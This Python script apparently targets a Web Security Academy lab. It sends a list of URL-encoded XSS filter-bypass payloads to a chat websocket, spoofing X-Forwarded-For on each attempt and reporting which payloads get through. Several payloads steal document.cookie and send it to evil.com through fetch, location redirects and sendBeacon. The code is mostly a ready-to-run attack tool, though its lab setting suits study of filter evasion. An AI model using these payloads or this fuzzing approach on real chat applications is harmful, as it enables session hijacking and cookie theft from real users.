#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_xss():
    url = "wss://0a9f00fb048cba34808035000032001d.web-security-academy.net/chat"
    
    # Exploiting the URL encoding bypass with different payloads
    payloads = [
        # URL encoding "onerror" to bypass filter
        "<img src=x on%65rror=print(1)>",
        "<img src=x on%65rror=print(document.cookie)>",
        "<img src=x on%65rror=print(document.domain)>",
        
        # Try with alert using URL encoding
        "<img src=x on%65rror=alert(1)>",
        "<img src=x on%65rror=alert(document.cookie)>",
        
        # Try other functions
        "<img src=x on%65rror=confirm(1)>",
        "<img src=x on%65rror=prompt(1)>",
        
        # Data exfiltration attempts
        "<img src=x on%65rror=fetch('http://evil.com?c='+document.cookie)>",
        "<img src=x on%65rror=location='http://evil.com?c='+document.cookie>",
        "<img src=x on%65rror=window.location='http://evil.com'>",
        
        # DOM manipulation
        "<img src=x on%65rror=document.body.innerHTML='<h1>XSS</h1>'>",
        
        # Cookie stealing
        "<img src=x on%65rror=navigator.sendBeacon('http://evil.com',document.cookie)>",
        
        # More encoding variations
        "<img src=x on%65rror%3dalert(1)>",  # %3d = '='
        "<img src=x on%65rror%3d%61lert(1)>", # %61 = 'a'
        
        # Double URL encoding
        "<img src=x on%2565rror=alert(1)>",  # %25 = '%'
        
        # Mix of encodings
        "<svg on%6coad=alert(1)>",  # %6c = 'l' for onload
        "<svg on%6co%61d=alert(1)>", # %6c = 'l', %61 = 'a'
        
        # Other event handlers with encoding
        "<body on%6coad=alert(1)>",
        "<body on%70ageshow=alert(1)>", # %70 = 'p'
        
        # Try encoding different parts
        "<img src=x o%6eerror=alert(1)>", # %6e = 'n'
        "<img src=x on%65%72%72%6f%72=alert(1)>", # 'error' fully encoded
    ]
    
    successful = []
    
    for i, payload in enumerate(payloads):
        headers = {
            'X-Forwarded-For': f'127.0.0.{i+200}',
            'Cookie': 'session=2HQSLLJZkjvQo1iCKN32guMIwjRZMEBe',
            'Origin': 'https://0a9f00fb048cba34808035000032001d.web-security-academy.net',
        }
        
        try:
            async with websockets.connect(url, extra_headers=headers) as ws:
                print(f"[{i+1}] Testing: {payload}")
                
                message = json.dumps({"message": payload})
                await ws.send(message)
                
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                
                if "error" in response:
                    error_msg = json.loads(response).get("error", "")
                    print(f"    [-] Blocked: {error_msg}")
                else:
                    print(f"    [+] SUCCESS! Response: {response[:150]}")
                    successful.append(payload)
                    
        except Exception as e:
            print(f"    [!] Error: {e}")
        
        await asyncio.sleep(0.5)
    
    print("\n" + "="*60)
    if successful:
        print(f"[+] WORKING PAYLOADS ({len(successful)}):")
        for p in successful:
            print(f"    {p}")
        print("\n[*] These payloads bypass the XSS filter!")
        print("[*] Try them manually in the chat to see if they execute.")
    else:
        print("[-] No successful bypasses found")

if __name__ == "__main__":
    print("Exploiting URL Encoding Bypass")
    print("="*60)
    asyncio.run(test_xss())